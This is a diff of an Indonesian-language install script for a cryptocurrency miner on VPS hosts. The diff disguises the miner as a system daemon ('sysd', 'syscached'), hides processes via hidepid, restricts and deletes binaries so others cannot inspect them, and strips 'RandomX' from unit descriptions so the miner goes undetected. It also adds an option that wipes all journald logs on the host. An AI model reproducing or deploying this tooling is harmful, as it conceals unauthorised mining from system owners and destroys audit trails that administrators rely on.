@@ -1,5 +1,5 @@
 #!/bin/sh
-# install.sh — pasang xcb CONN di VPS baru dari tarball rilis.
+# install.sh — pasang miner di VPS baru dari tarball rilis (algo via --algo).
 #
 # Dua cara pakai:
 #   1. Dari tarball yang sudah diekstrak:
@@ -7,21 +7,31 @@
 #   2. Unduh langsung dari GitHub Release:
 #        sudo ./install.sh --version v1.0.0 --wallet <alamat> --worker <nama>
 #
-# Skrip ini hanya menyentuh host lokal: binary + library, /etc/xcb/miner.env,
-# sysctl hugepages, wrapper sysd, unit syscached, dan hidepid /proc. Tidak
-# menghubungi host lain.
+# Skrip ini hanya menyentuh host lokal: binary + library, /etc/sysd/miner.env,
+# sysctl hugepages, unit syscached, dan hidepid /proc. Tidak menghubungi host
+# lain.
+#
+# Binary dipasang sebagai /usr/local/sbin/sysd: nama proses di ps, cmdline,
+# /proc/<pid>/exe, dan field _EXE di journal semuanya mengikuti nama file, jadi
+# tidak ada spoof yang perlu dideteksi. Wallet tetap tidak muncul di cmdline
+# karena config dibaca dari EnvironmentFile.
 set -eu
 
 REPO="ylxai/xcb-v2"
-PREFIX="/usr/local/bin"
-WRAPPER="/usr/local/sbin/sysd"
-CONF_DIR="/etc/xcb"
+BIN_DIR="/usr/local/sbin"
+BIN="${BIN_DIR}/sysd"
+LIB="${BIN_DIR}/libsyscache.so"
+CONF_DIR="/etc/sysd"
 CONF="${CONF_DIR}/miner.env"
+OLD_CONF="/etc/xcb/miner.env"
 UNIT="/etc/systemd/system/syscached.service"
 SVC="syscached"
-HIDE_UNIT="/etc/systemd/system/xcb-proc-hidepid.service"
+HIDE_UNIT="/etc/systemd/system/sysd-proc-hidepid.service"
+OLD_HIDE_UNIT="/etc/systemd/system/xcb-proc-hidepid.service"
 HIDE_DROPIN="/etc/systemd/system/${SVC}.service.d/10-hidepid.conf"
+HUGE_UNIT="/etc/systemd/system/syscache-hugepages.service"
 SYSCTL_CONF="/etc/sysctl.d/99-miner-hugepages.conf"
+BACKUP_ROOT="/root/sysd-backup"
 POOL=""
 
 TAG=""
@@ -32,17 +42,18 @@ ALGO="conn"
 FORCE=0
 DRY=0
 NO_HUGE=0
+VACUUM=0
 
 usage() {
     cat <<'EOF'
 Usage: install.sh [opsi]
 
 Sumber file:
-  (tanpa --version)     pakai xcb + librandomx_v2.so di direktori skrip ini
+  (tanpa --version)     pakai xcb + libsyscache.so di direktori skrip ini
   --version vX.Y.Z      unduh tarball rilis dari GitHub (atau "latest")
 
 Konfigurasi miner:
-  --wallet ADDR         alamat reward; wajib bila /etc/xcb/miner.env belum ada
+  --wallet ADDR         alamat reward; wajib bila /etc/sysd/miner.env belum ada
   --worker NAMA         nama worker (default: hostname)
   --algo ALGO           backend: randomy | conn | bloz | zcd (default: conn)
   --pool HOST:PORT      pool backend (default per algo: conn 17194,
@@ -52,8 +63,10 @@ Konfigurasi miner:
 
 Lainnya:
   --no-hugepages        jangan tulis sysctl hugepages
-  --force               timpa /etc/xcb/miner.env yang sudah ada
+  --force               timpa /etc/sysd/miner.env yang sudah ada
   --dry-run             cetak rencana tanpa mengubah apa pun
+  --vacuum-journal      kosongkan riwayat journald (hapus SEMUA log di host;
+                        entri lama memuat wallet sebelum build redaksi)
   -h, --help            tampilkan bantuan ini
 EOF
 }
@@ -79,6 +92,7 @@ while [ $# -gt 0 ]; do
         --no-hugepages) NO_HUGE=1; shift ;;
         --force)     FORCE=1; shift ;;
         --dry-run)   DRY=1; shift ;;
+        --vacuum-journal) VACUUM=1; shift ;;
         -h|--help)   usage; exit 0 ;;
         *)           die "opsi tidak dikenal: $1 (lihat --help)" ;;
     esac
@@ -150,12 +164,25 @@ if [ -n "$TAG" ]; then
 else
     SRC=$(CDPATH='' cd -- "$(dirname -- "$0")" && pwd)
     [ -f "${SRC}/xcb" ] || die "xcb tidak ada di ${SRC}; pakai --version vX.Y.Z"
-    [ -f "${SRC}/librandomx_v2.so" ] || die "librandomx_v2.so tidak ada di ${SRC}"
+    [ -f "${SRC}/libsyscache.so" ] || die "libsyscache.so tidak ada di ${SRC}"
     [ -f "${SRC}/SHA256SUMS" ] || die "SHA256SUMS tidak ada di ${SRC}"
     ( cd "$SRC" && sha256sum -c SHA256SUMS ) || die "checksum file tidak cocok"
 fi
 
 [ -f "${SRC}/syscached.service" ] || die "syscached.service tidak ada di ${SRC}; pakai tarball rilis"
+
+# Layout lama menyimpan config di /etc/xcb/miner.env. Kalau yang baru belum
+# ada, salin dulu supaya upgrade tidak perlu --wallet lagi; file lama
+# dipindahkan ke backup setelah direktori backup dibuat.
+if [ ! -f "$CONF" ] && [ -f "$OLD_CONF" ]; then
+    run install -d -m 0755 "$CONF_DIR"
+    run cp -a "$OLD_CONF" "$CONF"
+    run chmod 0600 "$CONF"
+    # XCB_TITLE tidak dipakai lagi: nama proses berasal dari nama file binary
+    # (sysd), dan build baru menghapus dukungan title spoof.
+    run sed -i '/^XCB_TITLE=/d' "$CONF"
+    log "migrasi konfigurasi: ${OLD_CONF} -> ${CONF}"
+fi
 
 if [ -n "$WALLET" ]; then
     case "$WALLET" in
@@ -183,58 +210,54 @@ if [ "$NO_HUGE" -eq 0 ]; then
 fi
 
 STAMP=$(date -u +%Y%m%d-%H%M%S)
-if [ -f "${PREFIX}/xcb" ]; then
-    run cp -a "${PREFIX}/xcb" "${PREFIX}/xcb.bak-${STAMP}"
-    if [ -f "${PREFIX}/librandomx_v2.so" ]; then
-        run cp -a "${PREFIX}/librandomx_v2.so" "${PREFIX}/librandomx_v2.so.bak-${STAMP}"
-    fi
-    log "backup lama: ${PREFIX}/xcb.bak-${STAMP}"
-fi
-# Unit lama ikut dibackup: unit baru memakai wrapper + EnvironmentFile, jadi
-# rollback binary saja akan meninggalkan unit yang tidak cocok dengan binary
-# lama (binary pra-PR #20 tidak membaca WALLET di jalur CONN).
-if [ -f "$UNIT" ]; then
-    run cp -a "$UNIT" "${UNIT}.bak-${STAMP}"
-    log "backup unit: ${UNIT}.bak-${STAMP}"
+BACKUP="${BACKUP_ROOT}-${STAMP}"
+NEED_BACKUP=0
+for f in "$BIN" "$LIB" "$UNIT" "$OLD_CONF" "$OLD_HIDE_UNIT" \
+         /usr/local/bin/xcb /usr/local/bin/librandomx_v2.so; do
+    if [ -f "$f" ]; then NEED_BACKUP=1; fi
+done
+if [ "$NEED_BACKUP" -eq 1 ]; then
+    # Backup di /root: file di /usr/local/bin masih bisa dibaca user lain dan
+    # akan mengungkap binary lama.
+    run install -d -m 0700 "$BACKUP"
+    for f in "$BIN" "$LIB" "$UNIT" "$OLD_HIDE_UNIT"; do
+        if [ -f "$f" ]; then
+            run cp -a "$f" "${BACKUP}/$(basename "$f")"
+        fi
+    done
+    for f in "$OLD_CONF" /usr/local/bin/xcb /usr/local/bin/librandomx_v2.so; do
+        if [ -f "$f" ]; then
+            run cp -a "$f" "${BACKUP}/$(basename "$f").old"
+        fi
+    done
+    # Backup dari installer lama (xcb.bak-*) juga world-readable.
+    for f in /usr/local/bin/xcb.bak-* /usr/local/bin/librandomx_v2.so.bak-*; do
+        if [ -e "$f" ]; then
+            run mv "$f" "${BACKUP}/"
+        fi
+    done
+    log "backup: ${BACKUP}"
 fi
 
-run install -d -m 0755 "$PREFIX"
-run install -m 0755 "${SRC}/xcb" "${PREFIX}/xcb"
-run install -m 0755 "${SRC}/librandomx_v2.so" "${PREFIX}/librandomx_v2.so"
+run install -d -m 0755 "$BIN_DIR"
+# 0750: hanya root yang bisa membaca binary. Nama file menentukan comm, exe,
+# dan _EXE di journal — tidak ada title spoof yang bisa menimbulkan anomali.
+run install -m 0750 "${SRC}/xcb" "$BIN"
+run install -m 0640 "${SRC}/libsyscache.so" "$LIB"
 if [ -f "${SRC}/VERSION" ]; then
-    run install -m 0644 "${SRC}/VERSION" "${PREFIX}/VERSION"
+    run install -m 0600 "${SRC}/VERSION" "${BIN_DIR}/VERSION"
 fi
 
-# Wrapper root-only supaya ExecStart dan `systemctl show` tidak memuat path
-# binary atau flag. Nilai diambil dari environment file saat runtime.
-run install -d -m 0755 "$(dirname "$WRAPPER")"
-if [ "$DRY" -eq 1 ]; then
-    printf '[dry-run] tulis %s (0700)\n' "$WRAPPER"
-else
-    cat > "$WRAPPER" <<'EOF'
-#!/bin/sh
-# Wrapper root-only untuk ExecStart. Semua nilai datang dari
-# /etc/xcb/miner.env (EnvironmentFile); tidak ada wallet di command line.
-set -eu
-: "${WALLET:?WALLET kosong di /etc/xcb/miner.env}"
-: "${WORKER:?WORKER kosong di /etc/xcb/miner.env}"
-# CONN_ADDRESS menang atas WALLET di Config::parse, dan hanya WALLET yang
-# memecah suffix ".worker" (sama seperti -u). Samakan keduanya tanpa suffix
-# supaya tidak ada alamat reward berbeda di antara dua variabel itu.
-CONN_ADDRESS="${WALLET%%.*}"
-export CONN_ADDRESS
-# ALGO dari miner.env memilih backend (randomy/conn/bloz/zcd). Tanpa ALGO,
-# installer ini tetap CONN seperti sebelumnya.
-set -- -a "${ALGO:-conn}" --worker "$WORKER" --ui=log
-# THREADS kosong = auto (Config memakai jumlah CPU); jangan paksa -t "".
-if [ -n "${THREADS:-}" ]; then
-    set -- "$@" -t "$THREADS"
+# Layout lama: binary world-readable di /usr/local/bin. Setelah salinan baru
+# terpasang, file lama dihapus supaya tidak ada binary bernama xcb yang bisa
+# dibaca dan di-strings.
+if [ -f /usr/local/bin/xcb ]; then
+    run rm -f /usr/local/bin/xcb /usr/local/bin/librandomx_v2.so
 fi
-exec /usr/local/bin/xcb "$@"
-EOF
-    chmod 0700 "$WRAPPER"
-    log "wrapper: ${WRAPPER} (0700)"
-fi
+
+# Tidak ada wrapper: Config membaca ALGO/WORKER/THREADS/POOL/WALLET/CONN_POOL
+# langsung dari EnvironmentFile, dan memecah suffix ".worker" dari WALLET
+# sendiri. ExecStart di unit menunjuk langsung ke /usr/local/sbin/sysd.
 
 if [ -n "$WALLET" ]; then
     run install -d -m 0755 "$CONF_DIR"
@@ -252,13 +275,10 @@ CONN_POOL=${POOL}
 WALLET=${WALLET}
 WORKER=${WORKER}
 THREADS=${THREADS}
-# Nama proses di ps + argv/env dikosongkan; hanya berlaku pada build
-# ENABLE_SELF_DEFENSE=ON, diabaikan oleh build biasa.
-XCB_TITLE=sysd
 EOF
         )
         chmod 0600 "$CONF"
-        log "konfigurasi: ${CONF} (algo ${ALGO}, pool ${POOL}, wallet ${WALLET}, worker ${WORKER}, ${THREADS} thread)"
+        log "konfigurasi: ${CONF} (algo ${ALGO}, pool ${POOL}, worker ${WORKER}, ${THREADS} thread)"
     fi
 fi
 
@@ -289,8 +309,8 @@ EOF
     chmod 0644 "$HIDE_UNIT"
     cat > "$HIDE_DROPIN" <<'EOF'
 [Unit]
-Wants=xcb-proc-hidepid.service
-After=xcb-proc-hidepid.service
+Wants=sysd-proc-hidepid.service
+After=sysd-proc-hidepid.service
 EOF
     chmod 0644 "$HIDE_DROPIN"
     log "hidepid: ${HIDE_UNIT} + ${HIDE_DROPIN}"
@@ -298,20 +318,50 @@ fi
 
 if [ "$DRY" -eq 0 ]; then
     systemctl daemon-reload
-    systemctl enable xcb-proc-hidepid.service >/dev/null 2>&1 || true
-    systemctl start xcb-proc-hidepid.service || true
+
+    # Unit hidepid lama masih ada: matikan lalu hapus, supaya tidak ada dua
+    # unit remount /proc dengan nama berbeda.
+    if [ -f "$OLD_HIDE_UNIT" ]; then
+        systemctl disable --now xcb-proc-hidepid.service 2>/dev/null || true
+        rm -f "$OLD_HIDE_UNIT"
+        log "unit hidepid lama dihapus: ${OLD_HIDE_UNIT}"
+    fi
+
+    # Deskripsi unit hugepages lama menyebut algoritma ("RandomX ..."); ganti
+    # ke nama netral. Unit ini dibuat di luar installer, perbaiki kalau ada.
+    if [ -f "$HUGE_UNIT" ] && grep -q RandomX "$HUGE_UNIT"; then
+        [ -d "$BACKUP" ] || install -d -m 0700 "$BACKUP"
+        cp -a "$HUGE_UNIT" "${BACKUP}/$(basename "$HUGE_UNIT")"
+        sed -i 's/^Description=.*/Description=Allocate hugepages for sysd/' "$HUGE_UNIT"
+        systemctl daemon-reload
+        log "hugepages: Description diganti di ${HUGE_UNIT} (backup: ${BACKUP})"
+    fi
+
+    systemctl enable sysd-proc-hidepid.service >/dev/null 2>&1 || true
+    systemctl start sysd-proc-hidepid.service || true
     systemctl enable "$SVC" >/dev/null 2>&1 || true
     systemctl restart "$SVC"
     sleep 5
     log "status: $(systemctl is-active "$SVC")"
     log "cek log: journalctl -u ${SVC} -n 30 --no-pager"
-    # Dengan XCB_TITLE (build self-defense) comm menjadi sysd dan argv kosong;
-    # build biasa tetap tampil sebagai xcb.
-    log "cek proses: ps -eo pid,ppid,comm,args | grep -E '[x]cb|[s]ysd'"
+    log "cek proses: ps -eo pid,ppid,comm,args | grep -E '[s]ysd'"
     log "cek hidepid: grep ' /proc ' /proc/mounts | grep -o 'hidepid=[a-z0-9]*'"
-    if [ -f "${PREFIX}/xcb.bak-${STAMP}" ]; then
-        log "rollback: install -m 0755 ${PREFIX}/xcb.bak-${STAMP} ${PREFIX}/xcb && install -m 0755 ${PREFIX}/librandomx_v2.so.bak-${STAMP} ${PREFIX}/librandomx_v2.so && install -m 0644 ${UNIT}.bak-${STAMP} ${UNIT} && systemctl daemon-reload && systemctl restart ${SVC}"
+    if [ -d "$BACKUP" ]; then
+        log "rollback: lihat ${BACKUP} — kembalikan sysd, libsyscache.so, syscached.service lalu systemctl daemon-reload && systemctl restart ${SVC}"
+    fi
+    if [ "$VACUUM" -eq 1 ]; then
+        log "PERINGATAN: --vacuum-journal menghapus SEMUA riwayat journald di"
+        log "PERINGATAN: host ini (semua unit, bukan hanya miner). Diperlukan"
+        log "PERINGATAN: karena entri sebelum build redaksi wallet memuat wallet mentah."
+        log "journal sebelum: $(journalctl --disk-usage)"
+        journalctl --rotate
+        journalctl --vacuum-time=1s
+        log "journal sesudah: $(journalctl --disk-usage)"
     fi
 else
+    if [ "$VACUUM" -eq 1 ]; then
+        printf '[dry-run] journalctl --rotate\n'
+        printf '[dry-run] journalctl --vacuum-time=1s\n'
+    fi
     log "dry-run selesai; tidak ada perubahan"
 fi
